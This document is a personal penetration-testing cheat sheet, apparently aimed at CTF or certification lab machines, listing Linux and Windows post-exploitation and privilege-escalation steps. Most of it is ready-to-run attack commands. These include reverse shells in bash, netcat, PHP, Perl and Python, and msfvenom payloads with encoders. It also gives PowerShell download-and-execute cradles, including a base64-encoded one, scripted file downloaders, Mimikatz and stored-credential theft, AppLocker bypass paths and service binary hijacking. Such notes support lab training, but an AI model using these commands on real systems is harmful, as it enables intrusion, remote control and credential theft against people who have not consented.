This is things to-do to get root


# Shell todos

1. Better shell
```
python -c "import pty;pty.spawn('/bin/bash');"
```

2. Get tab autocomplete
```
^Z
stty raw -echo
fg + enter
```
3. clearScreen on ctrl+l
```
export TERM=xterm
```

4.
getting root.txt
```
more c:\Users\Administrator\Desktop\root.txt > c:\output.txt
```

5.
reverse shells 

msfvenom -l to get wwhat u can put on -p (-p is where will this shell run, -f is what is programming language )

```
32 bit reverse shell on windows
/usr/src/metasploit-framework/msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=1001 -f python -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
```

```
32 bit linux
/usr/src/metasploit-framework/msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=1001 -f c -a x86 --platform linux -b "\x00\x0a\x0d" -e x86/shikata_ga_nai


```

6.
looking into iptables rules
```
cat /etc/iptables/rules.v4
```

7.
To knowucan run scripts on /dev/shm ot /tmp 
```
$ mount
```
tell which directly got EXEC




# Environment escapes

nmap --interactive
vi   ---> :!bash
vi   ---> :set shell=/bin/bash:shell
awk  ---> awk 'BEGIN {system("/bin/sh")}'
find ---> find / -exec /usr/bin/awk 'BEGIN {system("/bin/sh")}'\;
perl ---> perl -e 'exec "/bin/bash";'




# Technique

## Linux

* kernel exploit
* sudo -l 
* history and environment(env,bashrc,bashprofile)
* Linenum.py
* crontabs and systemd timers
* SUID binaries
* look for running process using `pspy` and try to get some unusual process/crons running or use the script below:
```
#!/bin/sh

#Loop by line
IFS=$'\n'

old_process = $(ps -eo command)

while true;do
	new_process=$(ps -eo command)
	diff <(echo "$old_process") <(echo "$new_process")
	sleep 1
	old_process=$new_process
done

```
* ps aux , look for services running as root like is mysql is running as root, and u have its creds, login and `xp_cmdshell` or `sys_exec('ls'); `
* check for config file, if mysql is there look for its config file, if some cms is there like prng monitor or drupal, google where is its config file, data files are stored and check there, these above steps will mostly get next step.
* netstat -antup (listening ports and services there) [ also look for services that are listening on 127.0.0.1 instead of 0.0.0.0]

=== idhar tak ni mila toh see what users, try to guess password , google karo


## Windows
http://www.fuzzysecurity.com/tutorials/16.html
(try to do something like linux also but some more too)

* windows-jaws-enum.ps1
* if we can write into IIS web server as current user, we can drop aspx shell, hit server on that and try to do `rotten potatoes` to priv esc. Requirement is web server is wriable.
* cronts, history etc ( given by jaws + PowerSploit )
* cmdkey /list ( get stored passwd )
	* if there are stored credentials, upload mimikats to server, move to some diretory where applocker allows it to run(google to find applocker bypass list),
* whoami /priv and check for rottenpotato:
	* SeImpersonatePrivilege
	* SeAssignPrimaryPrivilege
	* SeTcbPrivilege
	* SeBackupPrivilege
	* SeRestorePrivilege
	* SeCreateTokenPrivilege
	* SeLoadDriverPrivilege
	* SeTakeOwnershipPrivilege
	* SeDebugPrivilege
* /usr/src/metasploit-framework/msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=1001 -f exe -a x64 -o shell-1001.exe



# Linux


## Getting Reverse Shell

Attacker machine
```
nc -l 9001
```

Victim Machine
```
bash -i >& /dev/tcp/10.10.14.11/443 0>&1

OR

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.12.211 4444 >/tmp/f

OR 

php -r '$sock=fsockopen("10.11.0.167",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

OR 

perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

OR

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.12.211",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

```
## Ways to transfer files

* wget
* curl
* bash -i >& /dev/tcp/10.0.0.1/8080 0>&1


## Try to get root(Priv esc)

* find online exploits for linux version
	* like for uname -a = `Linux noob 4.4.0-24-generic #43-Ubuntu SMP Wed Jun 8 19:27:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux` we would search for `4.4.0-24-generic linux privelage escalation` 
	* OR run explitsuggester

### What's the distribution type? What version?

```
cat /etc/issue
cat /etc/*-release
cat /etc/lsb-release      # Debian based
cat /etc/redhat-release   # Redhat based
```
### What's the kernel version? Is it 64-bit?

```
cat /proc/version
uname -a
uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz-
```
### What can be learnt from the environmental variables?

```
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set
```

* Check our access on running services and crontabs( if we can write , we win)

* su - otherUser
	* try loggin into other user accounts with some default password

* sudo -l 
Get all files u as user can run as sudo

* find suid
	* `find / -user root -perm -002 -type f -not -path "/proc/*"  2>/dev/null`

* commands to try:
	* System info
		* uname -ia
		* cat `/etc/*-release`
		* lsb_release -a
	* pwd
	* env
	* history
	* Package installed 
		* dpkg -l (Debian based OSs)
		* rpm -qa (CentOS / openSUSE )
	* What's currently running on the box? What active network services are there?
		* ps aux
		* netstat -antup
		* arp -a
	* Who uses the box? What users? (And which ones have a valid shell)
		* cat /etc/passwd   `users with /bin/bash as terminals are actual users `
		* grep -vE "nologin|false" /etc/passwd
	* who else is logged in
		* who
		* last

* find all config files
	* `find . -iname '*config*'`

* tools/root-enum/Linenum.sh


## Rbash escape

* try command while loggin into ssh
	* ssh ryuu@10.11.1.72 whoami
	* ssh -t bash ryuu@10.11.1.72  (here export PATH=new PATH) (in this case path can be changed)
* try to open editors and !ls to exec cammand
* just run /bin/bash
* setting environment variable
```

hacker@beta:~$ BASH_CMDS[a]=/bin/sh;a 

$ /bin/bash
hacker@beta:~$ export PATH=$PATH:/bin/
hacker@beta:~$ export PATH=$PATH:/usr/bin
```
* can use `echo *` and `echo .*` instead of `ls`






# Windows


## Getting reverse shell

 
### 1st way

upload nc.exe on victim computer and `"nc.exe -nv 10.11.0.167 1234 -e C:\WINDOWS\System32\cmd.exe"`


### 2nd way 
Attacker machine
```
$ mv nishange/Shells/Invoke-PowerShellTcp.ps1  ./nishang
$ python -m SimpleHTTPServer 8080 &
$ nc -l PORT
```
> Remember to change `IP/PORT` and `Execute on download`

Victim

* if in powershell
```
C:/Users/ > IEX(New-Object Net-WebClient).downloadString('http://10.10.10.10:8080/nishang')
```

* if in cmd with powershell installed
```
C:/Users/ > Powershell "IEX(New-Object Net-WebClient).downloadString('http://10.11.0.35:8000/nishang')"

OR 

C:/Users/ > Powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALQBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEAMAAuADEAMAA6ADgAMAA4ADAALwBuAGkAcwBoAGEAbgBnACcAKQA=

OR

C:/Users/ > Powershell IEX(IWR('http://10.11.0.35:8000/nishang'));

OR 

site.com/?exec=echo IEX(New-Object Net-WebClient).downloadString('http://10.11.0.35:8000/nishang') | powershell -noprofile -

```

> `c:\windows\syswow64\windowspowershell\v1.0\powershell` can also be used instead of `powershell`

> to convert to this base64 format: `$ echo -n "IEX(New-Object Net-WebClient).downloadString('http://10.10.14.3:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64`

## Ways to transfer files

* tftp
* ftp 
* powershell IEX(New-Object Net-WebClient).downloadString('http://10.10.10.10:8080/nishang') or IWR('http://site.com/asdf')
* shares
* Create a `wget.vbs` file as follow on target system

```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

	* then on target system `cscript wget.vbs http://192.168.10.5/evil.exe evil.exe`

* Invoke-WebRequest -OutFile  b.exe http://10.10.12.211:8000/lonely-ebola.exe
* iwr -outf b.exe http://10.10.12.211:8000/lonely-ebola.exe
*  save the file as `wget.js`  and run like `cscript /nologo wget.js http://example.com`

```
	echo 'var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");' > wget.js
	echo 'WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);' >> wget.js
	echo 'WinHttpReq.Send();' >> wget.js
	echo 'WScript.Echo(WinHttpReq.ResponseText);' >> wget.js

	/* To save a binary file use this code instead of previous line
	echo 'BinStream = new ActiveXObject("ADODB.Stream");' > wget.js
	echo 'BinStream.Type = 1;' >> wget.js
	echo 'BinStream.Open();'   >> wget.js
	echo 'BinStream.Write(WinHttpReq.ResponseBody);' >> wget.js
	echo 'BinStream.SaveToFile("out.bin");' >> wget.js
*/
```

## Kernel exploits

1. run watson, if none found

2. systeminfo 
	if windows 2008 r2 box > try ms51-051

## Rotten Potato

* whoami /priv
* use when any of the tokens are there:
```
	* SeImpersonatePrivilege
	* SeAssignPrimaryPrivilege
	* SeTcbPrivilege
	* SeBackupPrivilege
	* SeRestorePrivilege
	* SeCreateTokenPrivilege
	* SeLoadDriverPrivilege
	* SeTakeOwnershipPrivilege
	* SeDebugPrivilege
```
* Ebowla the lonely.exe and reverse-shell.ps1 : gets lonely-ebola.exe and rever-ebowla.ps1
* upload the 2 files using:
	* Invoke-WebRequest -OutFile  b.exe http://10.10.12.211:8000/lonely-ebola.exe
	* iwr -outf b.exe http://10.10.12.211:8000/lonely-ebola.exe
	*  save the file as `wget.js`  and run like `cscript /nologo wget.js http://example.com`

```
		echo 'var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");' > wget.js
		echo 'WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);' >> wget.js
		echo 'WinHttpReq.Send();' >> wget.js
		echo 'WScript.Echo(WinHttpReq.ResponseText);' >> wget.js

		/* To save a binary file use this code instead of previous line
		echo 'BinStream = new ActiveXObject("ADODB.Stream");' > wget.js
		echo 'BinStream.Type = 1;' >> wget.js
		echo 'BinStream.Open();'   >> wget.js
		echo 'BinStream.Write(WinHttpReq.ResponseBody);' >> wget.js
		echo 'BinStream.SaveToFile("out.bin");' >> wget.js
*/
```
* ./potato * shell.exe

## Mimikatz

* `cmdkey /list` to see if there are stored credentials. 

[better is watch access ippsec video]

* ls /users/security/appdata/roaming/microsoft/protect/   <=== there will be some S-1---- like this, this is SID, copy this ID
* dir /users/security/appdata/roaming/microsoft/protect/sid
* (then there will be some UUID named file so get all of those files).
* download a md5 named file from c:/users/security/appdata/roaming/microsoft/credentials/




## Try to get root(Priv esc windows)


* In powershell check history:
	* cat (Get-PSReadlineOption).HistorySavePath
	* cat (Get-PSReadlineOption).HistorySavePath | sls password
	* cat (Get-PSReadlineOption).HistorySavePath | sls accountpassword

* sudo -l version of windows:
	* upload accesschk.exe
	* accesschk.exe /accepteula -uwcqv "Administrator" *

* Check for online exploits available
	*  After enumerating the OS version and Service Pack you should find out which privilege escalation vulnerabilities could be present. Using the KB patch numbers(`wmic qfe get Caption,Description,HotFixID,InstalledOn`) you can grep the installed patches to see if any are missing.
	* `C:\Windows\system32> wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."` use this to check is required KB patches are installed or not 
	
* if we get groups.xml
	* decrypting passwords using : `gpp-decrypt groups.xml`, this will give us a domain `X` and password for it
	* Dumping Active Directory users from linux with Impackets GetADUsers
		* from impacket module, there is a file `GetAdADUsers.py`, do, `$GetAdADUsers.py -all -dc-ip IP active.htb/X` and paste password
	* After having password, we can try `psexec.py active.htb/X@IP`

* Check our access on running services and crontabs( if we can write , we win)

* tools/enum/windows-jaws-enum.ps1
* rotten potato to priv esc with shell on webserver( windows version of dirty cow)
* hotfixes
* Mimikatz to crack admin password ( may not run on any directory bcz of applocker so just look at places where applocker doesnt check for files, such as C:\windows\system32\spool\drivers\color\ )
* if powershell is blocked , there are actually 32 and 64 bit version of pshell in every windows, so we can try running 32bit poowershell as `c:\windows\syswow64\windowspowershell\v1.0\powershell whoami`

* Look for configuration files at
	* c:\sysprep.inf
	* c:\sysprep\sysprep.xml
	* %WINDIR%\Panther\Unattend\Unattended.xml
	* %WINDIR%\Panther\Unattended.xml
	* web.config
	* unattend.xml
	* `dir /b /s *pass*`

## Some more

```
// What system are we connected to?
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

// Get the hostname and username (if available)
hostname
echo %username%

// Get users
net users
net user [username]

// Networking stuff
ipconfig /all

// Printer?
route print

// ARP-arific (tells ye PC kis kis aur logo sei connected hai)
arp -A

// Active network connections
netstat -ano

// Firewall fun (Win XP SP2+ only)
netsh firewall show state
netsh firewall show config

// Scheduled tasks
schtasks /query /fo LIST /v

// Running processes to started services
tasklist /SVC
net start

// Driver madness
DRIVERQUERY

// WMIC fun (Win 7/8 -- XP requires admin)
wmic /?
# Use wmic_info script!

// WMIC: check patch level
wmic qfe get Caption,Description,HotFixID,InstalledOn

// Search pathces for given patch
wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."

// AlwaysInstallElevated fun
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

// Other commands to run to hopefully get what we need
dir /s *pass* == *cred* == *vnc* == *.config*
findstr /si password *.xml *.ini *.txt
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

// Service permissions
sc query
sc qc [service_name]

// Accesschk stuff
accesschk.exe /accepteula (always do this first!!!!!)
accesschk.exe /accepteula -uwcqv "Administrator" *
accesschk.exe -ucqv [service_name] (requires sysinternals accesschk!)
accesschk.exe -uwcqv "Authenticated Users" * (won't yield anything on Win 8)
accesschk.exe -ucqv [service_name]

// Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\

// Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*

// Binary planting
sc config [service_name] binpath= "C:\nc.exe -nv [RHOST] [RPORT] -e C:\WINDOWS\System32\cmd.exe"
sc config [service_name] obj= ".\LocalSystem" password= ""
sc qc [service_name] (to verify!)
net start [service_name]

```



## Some doubtfull process

If the following process are running as root, we can leverage to get root:

ps aux | grep root

* vnc   (vncviewer -passwd passwordFile ip::5901)
* tmux (tmux -S /session)
* wget/1.16 croned







